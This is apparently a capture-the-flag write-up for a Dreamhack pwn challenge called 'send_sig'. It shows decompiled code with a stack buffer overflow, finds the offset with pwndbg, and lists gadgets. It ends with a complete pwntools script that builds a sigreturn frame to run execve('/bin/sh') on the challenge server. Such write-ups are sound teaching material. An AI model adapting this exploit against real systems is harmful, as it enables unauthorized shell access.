# Write-up of the challenge "send_sig "

This challenge is part of the "Binary exploitation" category and is in **Level 2**.

# Goal of the challenge

The objective of this challenge is to use **Sigreturn** to be able to spawn a **shell**.

## Program structure

```c
ssize_t sub_4010b6()
{
    write(1, "Signal:", 7);
    void buf;
    return read(0, &buf, 0x400);
}

void _start() __noreturn
{
    setvbuf(stdout, nullptr, 2, 0);
    setvbuf(stdin, nullptr, 1, 0);
    write(1, "++++++++++++++++++Welcome to dre…", 0x39);
    write(1, "+ You can send a signal to dream…", 0x39);
    write(1, "++++++++++++++++++++++++++++++++…", 0x39);
    sub_4010b6();
    exit(0);
    /* no return */
}
```

## Security breach

There is a basic **bof** vunlerability:

```c
return read(0, &buf, 0x400);
```

## Solution

At first when I got the binary I had no source code so what I did was try to find a **bof**:

```
pwndbg> cyclic 300
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
Starting program: /mnt/d/chals/Dreamhack/pwn/send_sig/send_sig
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
++++++++++++++++++Welcome to dreamhack++++++++++++++++++
+ You can send a signal to dreamhack server.           +
++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Signal:aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
 RBP  0x6161616161616162 ('baaaaaaa')
 RIP  0x4010fa ◂— ret

pwndbg> cyclic -o baaaaaaa
Finding cyclic pattern of 8 bytes: b'baaaaaaa' (hex: 0x6261616161616161)
Found at offset 8
```

As you can see we have a **bof** and the RBP crashed at **8** so to find the **RIP** we need to add an extra 8. Then I started by searching for any gadget like **syscall, pop rax** and even strings like **/bin/sh**. Turns out all of them existed:

1. Find binish

```
strings send_sig | grep '/bin/sh'
/bin/sh
```

2. Gadgets

```
ROPgadget --binary=send_sig | grep -E 'pop rax|syscall'
0x00000000004010a9 : cli ; push rbp ; mov rbp, rsp ; pop rax ; ret
0x00000000004010a6 : endbr64 ; push rbp ; mov rbp, rsp ; pop rax ; ret
0x00000000004010ac : mov ebp, esp ; pop rax ; ret
0x00000000004010ab : mov rbp, rsp ; pop rax ; ret
0x00000000004010ae : pop rax ; ret
0x00000000004010aa : push rbp ; mov rbp, rsp ; pop rax ; ret
0x00000000004010b0 : syscall
```

So we can see the picture here clearly we are trying to perform **sigreturn**, so all we need to do is overwrite the **RIP** to our **sig frame** but we need to make sure to send **syscall** with exit code **15** to make it read our **sig**.

solve.py:

```python
from pwn import *

context.arch = "amd64"
offset = 16

# p = process('./send_sig')
p = remote("host8.dreamhack.games", 13963)

elf = ELF('send_sig')
binish = next(elf.search('/bin/sh'))
rop = ROP(elf)

pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
syscall = rop.find_gadget(["syscall"])[0]


sig = SigreturnFrame()

sig.rip = syscall
sig.rax = 59
sig.rdi = binish

payload = b'A' * offset
payload += p64(pop_rax)
payload += p64(15)
payload += p64(syscall)
payload += bytes(sig)

p.sendline(payload)
p.interactive()

```
